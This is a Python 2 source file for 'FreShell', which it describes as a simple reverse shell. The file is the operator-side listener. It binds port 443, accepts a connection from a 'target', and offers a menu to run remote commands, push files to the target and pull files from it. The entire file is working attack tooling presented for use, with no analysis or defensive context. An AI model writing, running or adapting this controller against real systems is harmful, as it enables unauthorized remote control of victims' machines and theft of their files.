import os
import socket
import subprocess
import sys
import time

global i
i=0

def banner():
    print "\n[+] Freshnut's FreShell, a simple Python Reverse Shell. [+]\n"
    print """
==============================================================================
@@@@@@@@  @@@@@@@   @@@@@@@@   @@@@@@   @@@  @@@  @@@@@@@@  @@@       @@@       
@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@   @@@  @@@  @@@@@@@@  @@@       @@@       
@@!       @@!  @@@  @@!       !@@       @@!  @@@  @@!       @@!       @@!       
!@!       !@!  @!@  !@!       !@!       !@!  @!@  !@!       !@!       !@!       
@!!!:!    @!@!!@!   @!!!:!    !!@@!!    @!@!@!@!  @!!!:!    @!!       @!!       
!!!!!:    !!@!@!    !!!!!:     !!@!!!   !!!@!!!!  !!!!!:    !!!       !!!       
!!:       !!: :!!   !!:            !:!  !!:  !!!  !!:       !!:       !!:       
:!:       :!:  !:!  :!:           !:!   :!:  !:!  :!:        :!:       :!:      
 ::       ::   :::   :: ::::  :::: ::   ::   :::   :: ::::   :: ::::   :: ::::  
 :         :   : :  : :: ::   :: : :     :   : :  : :: ::   : :: : :  : :: : :  
==============================================================================
"""

host = ''
port = 443

def connect():
    global s
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error, msg:
        print "Couln't Create Socket."
        exit()

def bind():
    try:
        s.bind((host, port))
    except:
        print "Cannot bind Socket & Port."
        exit()

def listen():
    try:
        s.listen(3)
    except socket.error:
        print "wtf, can't listen?! What did you DO!?"
        exit()

def accept():
    global conn, addr
    conn, addr = s.accept()
    print "[+] New Target Connection: ", addr

# Interactive Shell
def command():
    while True:
        cmd = raw_input("freshell#> ")
        split = cmd.split(" ")
        cd = split[0]
        path = split[-1]
        try:
            conn.send(cmd)
        except:
            print "[-] Cannot send user input."
        if cmd == "quit":
            main()
        elif cd == "cd":
            continue
        else:
            data = conn.recv(4096)
            sys.stdout.write(data)
            sys.stdout.flush()

# Upload File
def snd_file():
    input_f = raw_input("File path: ")
    try:
        conn.send(input_f)
    except socket.error:
        print "[-] Cannot send file path."
    snd_f = open(input_f, "rb")
    read = snd_f.read()
    try:
        conn.send(read)
    except socket.error:
        print "[-] Cannot send data."
    snd_f.close()
    print "[+] File Sent"

# Recover File
def rcv_file():
    loc_f = raw_input("Remote file path: ")
    split = loc_f.split("/")
    filename = split[-1]
    try:
        conn.send(loc_f)
    except:
        print "[-] Cannot receive file location."
    try:
        data_f = conn.recv(10000)
    except:
        print "[-] Cannot receive data."
    rcv_f = open(filename, "wb+")
    rcv_f.write(data_f)
    rcv_f.close()
    print "[+] File retrieved"


def main():

    if addr:
            os.system("clear")
            sys.stdout.write("[+] Connected: ")
            print addr
    options = """
Options:

  1               Interactive Shell
                  - Type "quit" to return to menu from Interactive Shell
  2               Upload File
  3               Download File
  4               Target IP & Port
  q               Quit
  help            Display Options
  dc              Disconnect from Client"""
    print options
    while True:
        choice = raw_input("> ")
        if choice == "1":
            print "[+] Entering Shell\n"
            command()
        elif choice == "2":
            print "Upload File to: ", addr
            conn.send("snd_cli")
            snd_file()
        elif choice == "3":
            print "Download File from: ", addr
            conn.send("rcv_cli")
            rcv_file()
        elif choice == "4":
            try:
                conn.send("test")
                sys.stdout.write("[+] Connected: ")
                print addr
            except:
                sys.stdout.write("[-] Disconnected: ")
                print addr
        elif choice == "q":
            conn.send("D1SC0NN3CT")
            print "[+] Disconnecting Target & Exiting.."
            time.sleep(1)
            conn.close()
            s.close()
            print "[+] Exit"
            exit()
        elif choice == "help":
            os.system("clear")
            print options
        elif choice == "dc":
            print "[+] Disconnect from Target but don't Exit"
            conn.send("disconnect")
            time.sleep(1)
            conn.close()
        else:
            print "[-] wtf.. you broke it. Input Error"
            time.sleep(1) 
            main()

banner()
connect()
bind()
listen()
accept()
main()

# In case function don't exit & close socket properly.
s.close()
exit()
